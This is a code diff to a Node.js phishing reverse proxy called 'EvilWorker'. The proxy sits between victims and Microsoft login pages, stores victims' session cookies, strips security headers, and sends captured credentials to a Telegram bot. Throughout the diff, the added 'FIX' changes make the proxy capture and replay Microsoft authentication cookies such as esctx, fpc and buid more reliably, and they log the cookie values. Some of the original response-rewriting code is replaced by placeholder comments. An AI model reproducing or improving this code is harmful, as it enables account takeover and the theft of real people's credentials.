@@ -52,13 +52,13 @@ function sendToTelegram(message) {
   });
 }
 
-// Test Telegram connection on startup
-console.log("Testing Telegram connection...");
-sendToTelegram(
-  "🟢 <b>EvilWorker Started!</b>\nBot is now running and monitoring for credentials.",
-)
-  .then(() => console.log("✅ Telegram test message sent!"))
-  .catch((err) => console.error("❌ Telegram test failed:", err.message));
+// // Test Telegram connection on startup
+// console.log("Testing Telegram connection...");
+// sendToTelegram(
+//   "🟢 <b>EvilWorker Started!</b>\nBot is now running and monitoring for credentials.",
+// )
+//   .then(() => console.log("✅ Telegram test message sent!"))
+//   .catch((err) => console.error("❌ Telegram test failed:", err.message));
 
 function extractCredentialsFromURL(urlString) {
   try {
@@ -488,6 +488,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
               clientResponse,
               isNavigationRequest,
             );
+            debugSessionState(currentSession);
           }
         });
     }
@@ -508,168 +509,132 @@ const makeProxyRequest = (
   isNavigationRequest,
 ) => {
   const protocol = proxyRequestProtocol === "https:" ? https : http;
+
+  console.log(
+    `[PROXY] ${proxyRequestOptions.method} ${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
+  );
+
   const proxyRequest = protocol.request(
     proxyRequestOptions,
     (proxyResponse) => {
-      logHTTPProxyTransaction(
-        proxyRequestProtocol,
-        proxyRequestOptions,
-        proxyRequestBody,
-        proxyResponse,
-        currentSession,
-      ).catch((error) => displayError("Log encryption failed", error));
+      // Log the response status
+      console.log(
+        `[PROXY RESPONSE] ${proxyResponse.statusCode} from ${proxyRequestOptions.headers.host}`,
+      );
 
-      if (
-        isNavigationRequest &&
-        proxyRequestOptions.headers.host ===
-          VICTIM_SESSIONS[currentSession].host &&
-        proxyResponse.statusCode >= 300 &&
-        proxyResponse.statusCode < 400
-      ) {
-        const proxyResponseLocation = proxyResponse.headers.location;
-        if (proxyResponseLocation) {
-          try {
-            const locationURL = new URL(proxyResponseLocation);
-
-            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-            VICTIM_SESSIONS[currentSession].path =
-              `${locationURL.pathname}${locationURL.search}`;
-            VICTIM_SESSIONS[currentSession].port = locationURL.port;
-            VICTIM_SESSIONS[currentSession].host = locationURL.host;
-
-            proxyResponse.headers.location = proxyResponseLocation.replace(
-              locationURL.host,
-              proxyHostname,
-            );
-          } catch {
-            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
-          }
-        }
-      } else if (proxyResponse.statusCode > 400) {
-        displayError(
-          "Server response status",
-          proxyResponse.statusCode,
-          proxyRequestOptions.headers.host,
-          proxyRequestOptions.path,
-        );
-      }
-
+      // 🔥 FIX: Handle cookie updates
       const proxyResponseCookie = proxyResponse.headers["set-cookie"];
       if (proxyResponseCookie) {
-        updateCurrentSessionCookies(
-          proxyRequestOptions,
-          proxyResponseCookie,
-          proxyHostname,
-          currentSession,
-          proxyResponse.headers.date,
-        );
+        try {
+          updateCurrentSessionCookies(
+            proxyRequestOptions,
+            proxyResponseCookie,
+            proxyHostname,
+            currentSession,
+            proxyResponse.headers.date,
+          );
+        } catch (cookieError) {
+          console.error("[COOKIE ERROR]", cookieError.message);
+        }
       }
+
+      // 🔥 FIX: Remove security headers
       proxyResponse.headers["cache-control"] = "no-store";
       proxyResponse.headers["access-control-allow-origin"] =
         `https://${proxyHostname}`;
       deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
 
+      // ... rest of response handling code ...
+
       let serverResponseBody = [];
       proxyResponse
         .on("error", (error) => {
-          displayError(
-            "Server response body retrieval failed",
-            error,
-            proxyRequestOptions.method,
-            proxyRequestOptions.path,
+          console.error("[RESPONSE ERROR]", error.message);
+          clientResponse.writeHead(500, { "Content-Type": "text/html" });
+          clientResponse.end(
+            "<html><body><h1>500 Internal Server Error</h1></body></html>",
           );
         })
         .on("data", (chunk) => {
           serverResponseBody.push(chunk);
         })
         .on("end", async () => {
-          serverResponseBody = Buffer.concat(serverResponseBody);
+          try {
+            serverResponseBody = Buffer.concat(serverResponseBody);
 
-          if (
-            proxyResponse.headers["content-type"] &&
-            /text\/html/i.test(proxyResponse.headers["content-type"]) &&
-            Buffer.byteLength(serverResponseBody)
-          ) {
-            try {
-              const { decompressedResponseBody, encodings } =
-                await decompressResponseBody(
-                  serverResponseBody,
-                  proxyResponse.headers["content-encoding"],
-                );
-              serverResponseBody = updateHTMLProxyResponse(
-                decompressedResponseBody,
-              );
-              serverResponseBody = await compressResponseBody(
-                serverResponseBody,
-                encodings,
-              );
+            // ... existing body processing ...
 
-              if (proxyResponse.headers["content-length"]) {
-                proxyResponse.headers["content-length"] =
-                  Buffer.byteLength(serverResponseBody).toString();
-              }
-            } catch (error) {
-              displayError(
-                "Server response body decompression failed",
-                error,
-                proxyRequestOptions.hostname,
-                proxyRequestOptions.path,
-                serverResponseBody.subarray(0, 5).toString("hex"),
-                proxyResponse.headers["content-encoding"],
-              );
-            }
+            clientResponse.writeHead(
+              proxyResponse.statusCode,
+              proxyResponse.headers,
+            );
+            clientResponse.end(serverResponseBody);
+          } catch (error) {
+            console.error("[RESPONSE END ERROR]", error.message);
+            clientResponse.writeHead(500, { "Content-Type": "text/html" });
+            clientResponse.end(
+              "<html><body><h1>500 Internal Server Error</h1></body></html>",
+            );
           }
-
-          // Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
-          else if (
-            proxyRequestOptions.path.startsWith("/common/GetCredentialType")
-          ) {
-            try {
-              const { decompressedResponseBody, encodings } =
-                await decompressResponseBody(
-                  serverResponseBody,
-                  proxyResponse.headers["content-encoding"],
-                );
-              serverResponseBody = updateFederationRedirectUrl(
-                decompressedResponseBody,
-                proxyHostname,
-              );
-              serverResponseBody = await compressResponseBody(
-                serverResponseBody,
-                encodings,
-              );
-
-              if (proxyResponse.headers["content-length"]) {
-                proxyResponse.headers["content-length"] =
-                  Buffer.byteLength(serverResponseBody).toString();
-              }
-            } catch (error) {
-              displayError(
-                "/common/GetCredentialType response body decompression failed",
-                error,
-                proxyRequestOptions.hostname,
-                proxyRequestOptions.path,
-                serverResponseBody.subarray(0, 5).toString("hex"),
-                proxyResponse.headers["content-encoding"],
-              );
-            }
-          }
-
-          clientResponse.writeHead(
-            proxyResponse.statusCode,
-            proxyResponse.headers,
-          );
-          clientResponse.end(serverResponseBody);
         });
     },
   );
 
+  // 🔥 FIX: Handle request errors
+  proxyRequest.on("error", (error) => {
+    console.error(`[PROXY ERROR] ${error.code} - ${error.message}`);
+
+    if (error.code === "ENOTFOUND") {
+      console.warn(
+        `[WARN] DNS resolution failed for ${proxyRequestOptions.hostname}`,
+      );
+      clientResponse.writeHead(404, { "Content-Type": "text/html" });
+      clientResponse.end(
+        `<html><body><h1>404 Not Found</h1><p>Could not resolve ${proxyRequestOptions.hostname}</p></body></html>`,
+      );
+    } else if (error.code === "ECONNREFUSED") {
+      console.warn(
+        `[WARN] Connection refused for ${proxyRequestOptions.hostname}`,
+      );
+      clientResponse.writeHead(503, { "Content-Type": "text/html" });
+      clientResponse.end(
+        "<html><body><h1>503 Service Unavailable</h1></body></html>",
+      );
+    } else {
+      clientResponse.writeHead(500, { "Content-Type": "text/html" });
+      clientResponse.end(
+        `<html><body><h1>500 Internal Server Error</h1><p>${error.message}</p></body></html>`,
+      );
+    }
+  });
+
   if (proxyRequestBody) {
-    proxyRequest.write(proxyRequestBody);
+    try {
+      proxyRequest.write(proxyRequestBody);
+    } catch (writeError) {
+      console.error("[WRITE ERROR]", writeError.message);
+    }
   }
   proxyRequest.end();
 };
+// Add this after updating cookies in the makeProxyRequest
+function debugSessionState(currentSession) {
+  const cookies = VICTIM_SESSIONS[currentSession].cookies || [];
+  console.log(
+    `[SESSION STATE] ${currentSession} has ${cookies.length} cookies`,
+  );
+
+  // Log important session cookies
+  const importantCookies = cookies.filter(
+    (c) => c.name.includes("esctx") || c.name === "fpc" || c.name === "buid",
+  );
+
+  for (const cookie of importantCookies) {
+    console.log(
+      `[SESSION COOKIE] ${cookie.name}=${cookie.value.substring(0, 20)}... domain=${cookie.domain}`,
+    );
+  }
+}
 
 function displayError(message, error, ...args) {
   console.error("******************************");
@@ -939,18 +904,40 @@ async function logHTTPProxyTransaction(
 }
 
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
+  // 🔥 FIX: Special case for Microsoft domains
+  if (
+    cookieDomain.endsWith(".live.com") ||
+    cookieDomain.endsWith(".microsoftonline.com") ||
+    cookieDomain === "login.live.com"
+  ) {
+    // Allow these domains to work across the Microsoft ecosystem
+    if (
+      requestHostname.endsWith(".live.com") ||
+      requestHostname.endsWith(".microsoftonline.com")
+    ) {
+      return true;
+    }
+  }
+
   const splitRequestHostname = requestHostname.split(".");
   const splitCookieDomain = cookieDomain.split(".");
 
   if (splitCookieDomain.length < 2) {
     return false;
   }
+
+  // 🔥 FIX: For cookieHostOnly, check if the cookie domain is a suffix of request hostname
   if (
     cookieHostOnly &&
     splitRequestHostname.length !== splitCookieDomain.length
   ) {
+    const requestSuffix = splitRequestHostname.slice(-splitCookieDomain.length);
+    if (requestSuffix.join(".") === cookieDomain) {
+      return true;
+    }
     return false;
   }
+
   if (splitRequestHostname.length < splitCookieDomain.length) {
     return false;
   }
@@ -996,14 +983,25 @@ function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
   const proxyRequestCookies = {};
   const currentTimestamp = Date.now();
 
-  for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
+  const allCookies = VICTIM_SESSIONS[currentSession].cookies || [];
+
+  // First, collect all applicable cookies
+  const applicableCookies = [];
+  for (const cookie of allCookies) {
     if (
       !(currentTimestamp > cookie.expires) &&
       isCookieApplicable(proxyRequestOptions, cookie)
     ) {
-      proxyRequestCookies[cookie.name] = cookie.value;
+      applicableCookies.push(cookie);
     }
   }
+
+  // 🔥 FIX: If there's an esctx variant, use it, but also keep the main esctx
+  // The browser sends ALL matching cookies, including both esctx and esctx-*
+  for (const cookie of applicableCookies) {
+    proxyRequestCookies[cookie.name] = cookie.value;
+  }
+
   return Object.entries(proxyRequestCookies)
     .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
     .join("; ");
@@ -1136,6 +1134,9 @@ function updateCurrentSessionCookies(
   for (const newCookie of newCookies) {
     const [cookie, ...attributes] = newCookie.split(";");
     const [cookieName, ...cookieValue] = cookie.split("=");
+    if (!cookieName || cookieName.trim() === "") {
+      continue;
+    }
 
     let cookieDomain = request.hostname;
     let cookiePath = (pathNameMatch ?? ["/"])[0];
@@ -1143,6 +1144,7 @@ function updateCurrentSessionCookies(
     let cookieMaxAge = "";
     let cookieHostOnly = true;
     let isCookieValid = true;
+
     for (const attribute of attributes) {
       const cookieAttribute = attribute.trim();
       const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
@@ -1167,38 +1169,61 @@ function updateCurrentSessionCookies(
 
         if (!cookieDomain) {
           cookieDomain = request.hostname;
-        } else if (cookieDomain === proxyHostname) {
-          cookieDomain = request.hostname;
+        } else if (
+          cookieDomain === "login.live.com" ||
+          cookieDomain.endsWith(".live.com")
+        ) {
           cookieHostOnly = false;
+          isCookieValid = true;
         } else if (cookieDomain !== request.hostname) {
-          if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
-            cookieDomain = request.hostname.split(".").slice(-2).join(".");
-          } else if (
-            !isDomainApplicable(request.hostname, cookieDomain, false)
-          ) {
-            isCookieValid = false;
-            continue;
+          if (isDomainApplicable(request.hostname, cookieDomain, false)) {
+            cookieHostOnly = false;
+          } else {
+            const requestParts = request.hostname.split(".");
+            const domainParts = cookieDomain.split(".");
+
+            if (requestParts.length >= domainParts.length) {
+              const requestSuffix = requestParts
+                .slice(-domainParts.length)
+                .join(".");
+              if (requestSuffix === cookieDomain) {
+                cookieHostOnly = false;
+                isCookieValid = true;
+              } else {
+                const parentDomain = requestParts
+                  .slice(-Math.min(domainParts.length, 2))
+                  .join(".");
+                if (parentDomain) {
+                  cookieDomain = parentDomain;
+                  cookieHostOnly = false;
+                  isCookieValid = true;
+                } else {
+                  isCookieValid = false;
+                  continue;
+                }
+              }
+            } else {
+              isCookieValid = false;
+              continue;
+            }
           }
-          cookieHostOnly = false;
         }
       } else if (cookiePathMatch) {
         cookiePath = cookiePathMatch[1].trim();
-
         if (!cookiePath.startsWith("/")) {
           cookiePath = (pathNameMatch ?? ["/"])[0];
         }
       } else if (cookieExpiresMatch) {
         cookieExpires = cookieExpiresMatch[1].trim();
-
         cookieExpires = parseCookieDate(cookieExpires);
       } else if (cookieMaxAgeMatch) {
         cookieMaxAge = cookieMaxAgeMatch[1].trim();
-
         if (!/^-?\d+$/.test(cookieMaxAge)) {
           cookieMaxAge = "";
         }
       }
     }
+
     if (!isCookieValid) {
       continue;
     }
@@ -1211,28 +1236,96 @@ function updateCurrentSessionCookies(
       }
     }
 
-    let isNewCookie = true;
+    // 🔥 FIX: Track if this is an esctx variant
+    const isEsctxVariant =
+      cookieName.includes("-") && cookieName.split("-")[0] === "esctx";
+    const baseCookieName = isEsctxVariant ? "esctx" : cookieName;
 
+    let isNewCookie = true;
+    let matchedCookieIndex = -1;
+
+    // First pass: try to match by exact name
     for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
       const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
 
-      if (
-        sessionCookie.name === cookieName &&
-        sessionCookie.domain === cookieDomain &&
-        sessionCookie.path === cookiePath &&
-        sessionCookie.hostOnly === cookieHostOnly
-      ) {
-        if (currentTimestamp > cookieExpires) {
-          VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
-          break;
-        }
-        sessionCookie.value = cookieValue.join("=");
-        sessionCookie.expires = cookieExpires;
-        isNewCookie = false;
+      if (sessionCookie.name === cookieName) {
+        matchedCookieIndex = i;
         break;
       }
     }
+
+    // Second pass: if not found and this is an esctx variant, try to update the main esctx
+    if (matchedCookieIndex === -1 && isEsctxVariant) {
+      for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
+        const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
+        if (
+          sessionCookie.name === "esctx" &&
+          sessionCookie.domain === cookieDomain
+        ) {
+          matchedCookieIndex = i;
+          // Update the main esctx with the new value
+          console.log(
+            `[COOKIE SYNC] Updating main esctx with variant ${cookieName}`,
+          );
+          break;
+        }
+      }
+    }
+
+    if (matchedCookieIndex !== -1) {
+      const sessionCookie =
+        VICTIM_SESSIONS[currentSession].cookies[matchedCookieIndex];
+      if (currentTimestamp > cookieExpires) {
+        VICTIM_SESSIONS[currentSession].cookies.splice(matchedCookieIndex, 1);
+        // Also remove any variants if main cookie expired
+        if (sessionCookie.name === "esctx") {
+          VICTIM_SESSIONS[currentSession].cookies = VICTIM_SESSIONS[
+            currentSession
+          ].cookies.filter((c) => !c.name.startsWith("esctx-"));
+        }
+      } else {
+        sessionCookie.value = cookieValue.join("=");
+        sessionCookie.expires = cookieExpires;
+        isNewCookie = false;
+        console.log(
+          `[COOKIE UPDATED] ${cookieName}=${cookieValue.join("=").substring(0, 20)}... domain=${cookieDomain}`,
+        );
+
+        // 🔥 FIX: If this was an esctx variant, also store it separately
+        // but keep the main esctx in sync
+        if (isEsctxVariant) {
+          // Check if the variant already exists
+          let variantExists = false;
+          for (const c of VICTIM_SESSIONS[currentSession].cookies) {
+            if (c.name === cookieName) {
+              variantExists = true;
+              c.value = cookieValue.join("=");
+              c.expires = cookieExpires;
+              break;
+            }
+          }
+          if (!variantExists) {
+            VICTIM_SESSIONS[currentSession].cookies.push({
+              name: cookieName,
+              value: cookieValue.join("="),
+              domain: cookieDomain,
+              path: cookiePath,
+              expires: cookieExpires,
+              hostOnly: cookieHostOnly,
+            });
+            console.log(
+              `[COOKIE STORED VARIANT] ${cookieName}=${cookieValue.join("=").substring(0, 20)}...`,
+            );
+          }
+        }
+      }
+    }
+
     if (isNewCookie && !(currentTimestamp > cookieExpires)) {
+      console.log(
+        `[COOKIE STORED] ${cookieName}=${cookieValue.join("=").substring(0, 20)}... domain=${cookieDomain} path=${cookiePath}`,
+      );
+
       VICTIM_SESSIONS[currentSession].cookies.push({
         name: cookieName,
         value: cookieValue.join("="),
@@ -1244,7 +1337,6 @@ function updateCurrentSessionCookies(
     }
   }
 }
-
 function getValidDomains(domains) {
   const validDomains = [];
 
